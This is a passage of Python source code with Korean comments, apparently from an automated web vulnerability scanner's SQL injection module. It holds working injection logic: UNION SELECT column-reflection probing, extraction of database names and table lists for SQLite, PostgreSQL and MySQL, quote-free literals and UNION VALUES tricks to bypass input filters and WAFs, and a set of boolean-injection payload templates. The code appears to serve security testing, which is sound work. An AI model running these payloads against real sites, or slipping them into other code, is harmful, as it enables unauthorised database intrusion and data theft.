        echo하는 사이트에서는 실제로 어느 컬럼이 반사되는지와 무관하게 페이로드에 그 글자가 들어있다는
        이유로 무조건 매치되는 오탐이 생긴다. _go_union_extract가 0x7e7e 같은 hex 리터럴을 쓰는 것과 같은
        이유로, 여기서도 CONCAT(hex, hex)로 쪼개 넣는다 — 실행 전 원문에는 마커가 없고, 실제로 SELECT돼
        화면에 반사됐을 때만 CONCAT 결과로 완성된다.

        반사 안 시킬 나머지 컬럼은 NULL로 채운다 — 빈 문자열은 PostgreSQL처럼 UNION 컬럼 타입을 엄격히
        맞추는 DB에서 실제 컬럼이 숫자/날짜면 타입 불일치 에러로 UNION 전체가 깨질 수 있다. NULL은 타입이
        없어 어떤 컬럼 타입에도 맞춰져 더 안전하다.
        """
        key = (surface.url, surface.param)
        dialect = vuln_entry.get('detected_db')
        marker_bytes = self.UNION_MARKER.encode()
        marker_half = len(marker_bytes) // 2
        marker_hex_expr = self._dialect_concat(dialect, [
            self._dialect_bytes_literal(dialect, marker_bytes[:marker_half]),
            self._dialect_bytes_literal(dialect, marker_bytes[marker_half:]),
        ])
        reflect_col = None
        reflect_payload = None
        # ORDER BY는 이미 quote_char로 성공했을 수 있는 다른 shape의 페이로드라, 그게 통과했다고 UNION
        # SELECT도 통과한다는 보장은 없다 — 그래서 여기서도 boolean/error-time과 같은 원칙으로, 첫 컬럼
        # 시도는 self._quote_signal 값과 무관하게 반드시 직접 해보고 그것까지 막혔을 때만(기존 증거 + 이
        # 단계 자체 확인, 두 증거가 겹칠 때만) 나머지 컬럼을 스킵한다.
        union_quote_hopeless = False
        for col_idx in range(1, col_count + 1):
            if union_quote_hopeless:
                continue  # UNION SELECT 모양도 우회 불가로 이미 확인됨 — 요청 없이 스킵
            cols = ['NULL'] * col_count
            cols[col_idx - 1] = marker_hex_expr
            payload = f"{injection_prefix} UNION SELECT {','.join(cols)} {comment}"
            status, body, _, used_payload, _ = self._send_evading(
                surface, base_fields, payload, f'enum(union-reflect col{col_idx})', waf_hits, waf_evasions,
            )
            if status is None and dialect == 'SQLite':
                # select라는 단어 자체를 필터링하는 사이트(입력을 소문자로 바꾼 뒤 부분 문자열로
                # 검사)에서는 EVASION_TRANSFORMS(공백/대소문자 변형)로 못 뚫는다 — SELECT를 아예 안
                # 쓰는 VALUES(...) 문법(SQLite가 UNION의 두 번째 분기로 오래전부터 지원)으로 재시도한다.
                values_payload = f"{injection_prefix} UNION VALUES({','.join(cols)}) {comment}"
                status, body, _, used_payload, _ = self._send_evading(
                    surface, base_fields, values_payload, f'enum(union-reflect-values col{col_idx})',
                    waf_hits, waf_evasions,
                )
            if status is None:
                if not union_quote_hopeless and self._quote_signal.get(key, False):
                    union_quote_hopeless = True
                    print(f"    [Enum] UNION SELECT 첫 컬럼 우회 실패(quote_char 우회 불가 이미 확인됨) "
                          f"— 나머지 컬럼은 스킵")
                continue
            if self.UNION_MARKER in body:
                reflect_col = col_idx
                reflect_payload = used_payload
                break

        vuln_entry['attack_vectors']['UNION']['reflected_column'] = reflect_col
        vuln_entry['attack_vectors']['UNION']['reflect_payload'] = reflect_payload
        if reflect_col is not None:
            self._go_union_extract(surface, base_fields, col_count, reflect_col, comment, vuln_entry,
                                    injection_prefix, waf_hits, waf_evasions)

    def _go_union_extract(self, surface, base_fields, col_count, reflect_col, comment, vuln_entry: dict,
                           injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
        """반사 컬럼을 이용해 db명과 테이블 목록을 추출한다.

        db명 개념/테이블 목록 조회 방식이 방언마다 달라서(SQLite는 파일 하나가 곧 DB라 이름 개념이 없고
        sqlite_master로 테이블을 나열하며, MySQL/PostgreSQL은 information_schema를 쓴다) 방언별로 다른 쿼리를
        쓴다. 문자열 리터럴(table, public 등)도 quote 없이 _dialect_bytes_literal로 만든다 — 따옴표까지
        필터링하는 사이트에 대응하기 위해서다.
        """
        dialect = vuln_entry.get('detected_db')
        clean = (dialect or '').replace(' (추정)', '').strip()
        marker_lit = self._dialect_bytes_literal(dialect, b'~~')

        def _build(expr, use_values=False):
            cols = ['NULL'] * col_count
            cols[reflect_col - 1] = self._dialect_concat(dialect, [marker_lit, expr, marker_lit])
            keyword = 'VALUES(' if use_values else 'SELECT '
            closing = ')' if use_values else ''
            return f"{injection_prefix} UNION {keyword}{','.join(cols)}{closing} {comment}"

        if clean == 'SQLite':
            # SQLite는 current_db 개념이 없어(SQL_DIALECTS 참고) db_name 단계를 건너뛰고 바로 테이블
            # 목록으로 간다. sqlite_master가 MySQL의 information_schema.tables 역할을 한다. 단, 이 expr
            # 자체가 sqlite_master를 읽는 중첩 SELECT를 포함해 select 단어 필터는 VALUES로도 못 피한다
            # (테이블을 읽으려면 SELECT가 필요) — 그래도 바깥쪽 UNION만이라도 VALUES로 바꿔두면 바깥
            # SELECT 때문에 걸리는 경우는 구제된다.
            table_lit = self._dialect_bytes_literal(dialect, b'table')
            table_expr = f"(SELECT group_concat(name) FROM sqlite_master WHERE type={table_lit})"
            targets = [('tables', table_expr)]
        elif clean == 'PostgreSQL':
            public_lit = self._dialect_bytes_literal(dialect, b'public')
            targets = [
                ('db_name', 'current_database()'),
                ('tables', f"(SELECT string_agg(table_name,',') FROM information_schema.tables "
                           f"WHERE table_schema={public_lit})"),
            ]
        else:
            # MySQL 또는 dialect 미확정 — 기존 동작 유지
            targets = [
                ('db_name', 'database()'),
                ('tables', "(SELECT group_concat(table_name ORDER BY table_name SEPARATOR ',') "
                           "FROM information_schema.tables WHERE table_schema=database())"),
            ]

        union_info = vuln_entry['attack_vectors']['UNION']
        for label, expr in targets:
            status, body, _, used_payload, _ = self._send_evading(
                surface, base_fields, _build(expr), f'enum(union-extract:{label})', waf_hits, waf_evasions,
            )
            if status is None and clean == 'SQLite':
                # _go_union_reflect와 같은 이유 — select 단어 자체를 필터링하는 사이트에서는 바깥쪽
                # UNION SELECT를 VALUES로 바꿔 재시도한다.
                status, body, _, used_payload, _ = self._send_evading(
                    surface, base_fields, _build(expr, use_values=True), f'enum(union-extract-values:{label})',
                    waf_hits, waf_evasions,
                )
            if status is None:
                continue
            match = re.search(r'~~([^~<]{1,256})~~', body)
            print(f"    [UnionExtract] label={label} status={status} match={match and match.group(1)}")
            if match:
                # 이 추출이 성공한 브랜치의 방언 = 확정 지문. 방언 판별이 Unknown으로 실패했어도(uid
                # 동등비교라 버전-LIKE 판별이 참/거짓을 못 가르는 앱 등), UNION 추출이 실제로 성공했다는
                # 것 자체가 가장 강한 근거라 여기서 detected_db를 확정한다(추가 요청 0). 그래야 요약에
                # DB명이 뜨고, blind를 안 탄 UNION 경로에서도 방언이 공란으로 남지 않는다.
                if vuln_entry.get('detected_db') in (None, 'Unknown'):
                    vuln_entry['detected_db'] = clean if clean in ('SQLite', 'PostgreSQL') else 'MySQL'
                if label == 'db_name':
                    union_info['db_name'] = match.group(1)
                    union_info['db_name_payload'] = used_payload
                else:
                    union_info['tables'] = match.group(1).split(',')
                    union_info['tables_payload'] = used_payload

    # ── 페이로드 세트 ─────────────────────────────────────────────────────────

    @staticmethod
    def _bool_cond_variants(quote_char: str) -> dict[str, tuple[list[str], list[str]]]:
        """스타일별 (항상-참 조건들, 항상-거짓 조건들). 인덱스 0은 초기 스캔에, 인덱스 1~는
        등가 클러스터 재검증에 쓴다 — 논리값은 같지만 리터럴 표기는 제각각이라, 특정 문자열에
        반응하는 필터/앱상태가 만든 콘텐츠 차이를 SQL 불리언 평가와 구분하는 데 쓴다."""
        q = quote_char
        return {
            # 숫자 컨텍스트 (bare)
            'num':        (['1=1', '2=2', '9=9'],
                           ['1=2', '3=4', '9=8']),
            # 문자열 컨텍스트, 페이로드가 따옴표를 스스로 닫음 (주석과 함께): '1'='1'
            'str_closed': ([f"{q}1{q}={q}1{q}", f"{q}a{q}={q}a{q}", f"{q}z{q}={q}z{q}"],
                           [f"{q}1{q}={q}2{q}", f"{q}a{q}={q}b{q}", f"{q}x{q}={q}y{q}"]),
            # 문자열 컨텍스트, 앱 템플릿의 뒤따르는 따옴표에 기대 닫음 (주석 없음): '1'='1
            'str_open':   ([f"{q}1{q}={q}1", f"{q}a{q}={q}a", f"{q}z{q}={q}z"],
                           [f"{q}1{q}={q}2", f"{q}a{q}={q}b", f"{q}x{q}={q}y"]),
        }

    @staticmethod
    def _build_boolean_payloads(orig_val, quote_char: str):
        """각 항목 (true_payload, false_payload, build, style):
          - true/false_payload: 초기 스캔용(조건 인덱스 0) — 기존과 동일한 12개.
          - build(cond): 같은 스캐폴드(접두사·연결어·따옴표·LIMIT·주석)에 임의의 불리언
            조건만 끼운 페이로드를 만든다. 등가 클러스터 재검증에서 리터럴만 바꾼 변형을
            생성하는 데 쓴다.
          - style: build에 넣을 조건을 _bool_cond_variants의 어느 형식에서 뽑을지."""
        orig = str(orig_val)
        q = quote_char
        # (build, style) — build의 {c} 자리에 스타일에 맞는 조건이 들어간다.
        templates = [
            (lambda c: f"{q} AND {c}",            'str_open'),    # ' AND '1'='1
            (lambda c: f"{q} OR {c} --",          'str_closed'),  # ' OR '1'='1' --
            (lambda c: f"{q} OR {c} #",           'str_closed'),
            (lambda c: f"%{q} AND {c} --",        'num'),         # %' AND 1=1 --
            (lambda c: f"%{q} OR {c} LIMIT 1 --", 'num'),
            (lambda c: f"%{q} AND {c} #",         'num'),
            (lambda c: f"%{q} OR {c} LIMIT 1 #",  'num'),
            (lambda c: f"{orig} AND {c}",         'num'),         # 원본 값 기반
            (lambda c: f"{orig}{q} AND {c}",      'str_open'),
            (lambda c: f"{orig}%{q} AND {c} --",  'num'),
            (lambda c: f"{orig}%{q} OR {c} --",   'num'),
            (lambda c: f"{orig}%{q} AND {c} #",   'num'),
        ]
        variants = SQLiStrategy._bool_cond_variants(q)
        out = []
        for build, style in templates:
            true_c0, false_c0 = variants[style][0][0], variants[style][1][0]
            out.append((build(true_c0), build(false_c0), build, style))
        return out

    # ── 결과 변환 ────────────────────────────────────────────────────────────

    def _to_vuln_result(self, surface: AttackSurface, vuln_entry: dict) -> VulnResult:
        av = vuln_entry.get('attack_vectors', {})
        union = av.get('UNION', {})
        # UNION/blind(boolean)/blind(time) 어느 경로로든 실제 데이터(db명 등)를 뽑아냈으면,
        # 그 자체가 확실한 증거라 애초 탐지가 약한 신호였어도 CRITICAL로 올린다.
        extracted_db = (union.get('db_name')
                        or av.get('blind_boolean', {}).get('db_name')
                        or av.get('blind_time', {}).get('db_name'))
        if union.get('db_name') or union.get('tables') or extracted_db:
            severity = 'CRITICAL'
        elif vuln_entry.get('evidence_kind') == 'status':
            # boolean/error(본문)/time 중 어느 것도 확정 못 하고 상태코드 변화 하나로만
            # 채택된 의심 신호 — SQLi로 확정된 게 아니라 HIGH로 보고하면 과장이다.
            severity = 'INFO'
        else:
            severity = 'HIGH'

        payload = vuln_entry.get('payload') or vuln_entry.get('true_payload', '')
        evidence_bits = [vuln_entry['type']]
        if vuln_entry.get('detected_db'):
            evidence_bits.append(f"db={vuln_entry['detected_db']}")
        if union.get('columns'):
            evidence_bits.append(f"union_columns={union['columns']}")
        if extracted_db:
            evidence_bits.append(f"extracted_db={extracted_db}")
        if union.get('tables'):
            evidence_bits.append(f"tables={len(union['tables'])}개")

        return VulnResult(
            surface=surface,
            vuln_type='SQLi',
            severity=severity,
            payload=payload,
            evidence=' | '.join(evidence_bits),
            detail=vuln_entry,
        )
